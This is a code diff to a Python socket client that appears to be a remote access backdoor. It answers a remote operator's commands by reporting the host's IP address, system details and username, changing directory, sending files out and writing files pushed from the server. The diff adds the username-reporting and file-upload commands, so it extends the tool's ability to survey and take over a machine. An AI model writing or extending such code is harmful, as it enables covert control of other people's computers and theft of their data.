@@ -3,6 +3,7 @@ import sys
 import psutil
 import platform
 from socket import *
+from getpass import *
 
 def sendfile(filename, socket):
     f = open(str(filename), 'rb')
@@ -23,7 +24,7 @@ msg = bytes(message).decode('ascii')
 while str(msg) != 'exit':
     try:
         if msg == 'ip':
-            res = str(psutil.net_if_addrs())
+            res = str(psutil.net_if_addrs()['WiFi'][1].address)
             s.send(res.encode('ascii'))
         elif msg == 'sys':
             res = str(platform.uname())
@@ -71,6 +72,16 @@ while str(msg) != 'exit':
             fn = msg.replace('cd ', '')
             os.chdir(fn)
             s.send(str('file changed !').encode('ascii'))
+        elif msg == 'user':
+            un = getuser()
+            s.send(str(un).encode('ascii'))
+        elif msg.startswith('upload'):
+            filename = msg.replace('upload ', '')
+            fd = s.recv(1000000000)
+            f = open(filename, 'wb')
+            f.write(fd)
+            f.close()
+            
                 
         message = s.recv(2000)
         msg = bytes(message).decode('ascii')
